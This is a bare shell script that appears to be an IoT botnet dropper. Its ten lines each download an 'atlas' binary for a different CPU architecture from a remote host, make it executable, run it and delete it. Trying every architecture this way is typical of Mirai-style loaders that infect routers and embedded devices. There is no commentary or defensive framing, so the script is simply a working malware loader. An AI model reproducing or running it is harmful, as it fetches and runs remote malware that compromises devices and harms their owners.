#!/bin/bash
wget http://1.1.1.1/bins/atlas.x86 -O b; chmod 777 b; ./b max.x86; rm -rf b
wget http://1.1.1.1/bins/atlas.mips -O b; chmod 777 b; ./b max.mips; rm -rf b
wget http://1.1.1.1/bins/atlas.mpsl -O b; chmod 777 b; ./b max.mipsel; rm -rf b
wget http://1.1.1.1/bins/atlas.arm4 -O b; chmod 777 b; ./b max.arm4; rm -rf b
wget http://1.1.1.1/bins/atlas.arm5 -O b; chmod 777 b; ./b max.arm5; rm -rf b
wget http://1.1.1.1/bins/atlas.arm6 -O b; chmod 777 b; ./b max.arm6; rm -rf b
wget http://1.1.1.1/bins/atlas.arm7 -O b; chmod 777 b; ./b max.arm7; rm -rf b
wget http://1.1.1.1/bins/atlas.ppc -O b; chmod 777 b; ./b max.powerpc; rm -rf b
wget http://1.1.1.1/bins/atlas.m68k -O b; chmod 777 b; ./b max.m68k; rm -rf b
wget http://1.1.1.1/bins/atlas.sh4 -O b; chmod 777 b; ./b max.sh4; rm -rf b